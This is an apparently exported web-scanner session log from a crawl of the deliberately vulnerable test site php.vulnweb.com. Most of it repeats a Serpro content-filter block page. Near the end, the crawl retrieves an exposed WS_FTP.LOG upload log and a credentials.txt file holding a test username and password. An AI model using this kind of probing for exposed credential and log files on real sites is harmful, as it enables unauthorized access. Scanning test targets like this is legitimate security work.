Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Connection: keep-alive
Content-Type: text/html
Cache-Control: no-cache
Content-Length: 3659
X-Frame-Options: deny

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/7.jpg.tn");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:49:11</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></RawResponse><Request id="E7330A41CFCDCC9DCB4118D50B7E9B45"><Method>GET</Method><Path>/pictures/</Path><File>7.jpg</File><Ext>tn</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="E7330A41CFCDCC9DCB4118D50B7E9B45";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="c0eddd15";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="9c3f4374";sc="1";tid="36";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>403</StatusCode><StatusDescription>URLBlocked-Serpro</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/7.jpg.tn");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:49:11</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Cache-Control</Name><Value>no-cache</Value></Header><Header><Name>Content-Length</Name><Value>3659</Value></Header><Header><Name>X-Frame-Options</Name><Value>deny</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="7836BF31381A834F702ACDA8226CFA98"><URL>http://php.vulnweb.com:80/pictures/8.jpg.tn</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="7836BF31381A834F702ACDA8226CFA98"><![CDATA[GET /pictures/8.jpg.tn HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="7836BF31381A834F702ACDA8226CFA98";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="255987aa";
X-Request-Memo: ID="95ee493a";sc="1";tid="37";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 403 URLBlocked-Serpro
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Connection: keep-alive
Content-Type: text/html
Cache-Control: no-cache
Content-Length: 3659
X-Frame-Options: deny

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/8.jpg.tn");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:49:11</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></RawResponse><Request id="7836BF31381A834F702ACDA8226CFA98"><Method>GET</Method><Path>/pictures/</Path><File>8.jpg</File><Ext>tn</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="7836BF31381A834F702ACDA8226CFA98";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="255987aa";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="95ee493a";sc="1";tid="37";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>403</StatusCode><StatusDescription>URLBlocked-Serpro</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/8.jpg.tn");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:49:11</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Cache-Control</Name><Value>no-cache</Value></Header><Header><Name>Content-Length</Name><Value>3659</Value></Header><Header><Name>X-Frame-Options</Name><Value>deny</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="12BDBBDA2F35BF064A6394360A1F928B"><URL>http://php.vulnweb.com:80/pictures/WS_FTP.LOG</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="12BDBBDA2F35BF064A6394360A1F928B"><![CDATA[GET /pictures/WS_FTP.LOG HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="12BDBBDA2F35BF064A6394360A1F928B";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="0dbd6bff";
X-Request-Memo: ID="3b2bd7ed";sc="1";tid="38";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:49:11 GMT
ETag: "497996bd-303"
Server: nginx/1.19.0
X-Cache: MISS from 189.9.60.27
Connection: keep-alive
Content-Type: application/octet-stream
Accept-Ranges: bytes
Last-Modified: Fri, 23 Jan 2009 10:06:53 GMT
Content-Length: 771

103.05.06 13:17 B d:\smz\_notes\colors.xml <-- mathsmz /smz/_notes colors.xml
103.05.06 13:33 B D:\SMZ\_notes\colors.xml --> duh.xtech.ru /SMZ/_notes colors.xml
103.05.06 13:33 B D:\SMZ\_notes\dwSiteColumnsMe.xml --> duh.xtech.ru /SMZ/_notes dwSiteColumnsMe.xml
103.05.06 13:33 B D:\SMZ\_notes\flash.xml --> duh.xtech.ru /SMZ/_notes flash.xml
103.05.06 13:33 B D:\SMZ\_notes\images.xml --> duh.xtech.ru /SMZ/_notes images.xml
103.05.06 13:33 B D:\SMZ\_notes\movies.xml --> duh.xtech.ru /SMZ/_notes movies.xml
103.05.06 13:33 B D:\SMZ\_notes\scripts.xml --> duh.xtech.ru /SMZ/_notes scripts.xml
103.05.06 13:33 B D:\SMZ\_notes\shockwave.xml --> duh.xtech.ru /SMZ/_notes shockwave.xml
103.05.06 13:33 B D:\SMZ\_notes\urls.xml --> duh.xtech.ru /SMZ/_notes urls.xml
]]></RawResponse><Request id="12BDBBDA2F35BF064A6394360A1F928B"><Method>GET</Method><Path>/pictures/</Path><File>WS_FTP</File><Ext>LOG</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="12BDBBDA2F35BF064A6394360A1F928B";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="0dbd6bff";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="3b2bd7ed";sc="1";tid="38";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[103.05.06 13:17 B d:\smz\_notes\colors.xml <-- mathsmz /smz/_notes colors.xml
103.05.06 13:33 B D:\SMZ\_notes\colors.xml --> duh.xtech.ru /SMZ/_notes colors.xml
103.05.06 13:33 B D:\SMZ\_notes\dwSiteColumnsMe.xml --> duh.xtech.ru /SMZ/_notes dwSiteColumnsMe.xml
103.05.06 13:33 B D:\SMZ\_notes\flash.xml --> duh.xtech.ru /SMZ/_notes flash.xml
103.05.06 13:33 B D:\SMZ\_notes\images.xml --> duh.xtech.ru /SMZ/_notes images.xml
103.05.06 13:33 B D:\SMZ\_notes\movies.xml --> duh.xtech.ru /SMZ/_notes movies.xml
103.05.06 13:33 B D:\SMZ\_notes\scripts.xml --> duh.xtech.ru /SMZ/_notes scripts.xml
103.05.06 13:33 B D:\SMZ\_notes\shockwave.xml --> duh.xtech.ru /SMZ/_notes shockwave.xml
103.05.06 13:33 B D:\SMZ\_notes\urls.xml --> duh.xtech.ru /SMZ/_notes urls.xml
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:49:11 GMT</Value></Header><Header><Name>ETag</Name><Value>"497996bd-303"</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>X-Cache</Name><Value>MISS from 189.9.60.27</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>application/octet-stream</Value></Header><Header><Name>Accept-Ranges</Name><Value>bytes</Value></Header><Header><Name>Last-Modified</Name><Value>Fri, 23 Jan 2009 10:06:53 GMT</Value></Header><Header><Name>Content-Length</Name><Value>771</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="F615DE426D88388DA2443306C2978F3F"><URL>http://php.vulnweb.com:80/pictures/credentials.txt</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="F615DE426D88388DA2443306C2978F3F"><![CDATA[GET /pictures/credentials.txt HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="F615DE426D88388DA2443306C2978F3F";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="d0f8070c";
X-Request-Memo: ID="bd9cd13e";sc="1";tid="39";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:49:11 GMT
ETag: "4979a05e-21"
Server: nginx/1.19.0
X-Cache: MISS from 189.9.60.27
Connection: keep-alive
Content-Type: text/plain
Accept-Ranges: bytes
Last-Modified: Fri, 23 Jan 2009 10:47:58 GMT
Content-Length: 33

username=test
password=something]]></RawResponse><Request id="F615DE426D88388DA2443306C2978F3F"><Method>GET</Method><Path>/pictures/</Path><File>credentials</File><Ext>txt</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
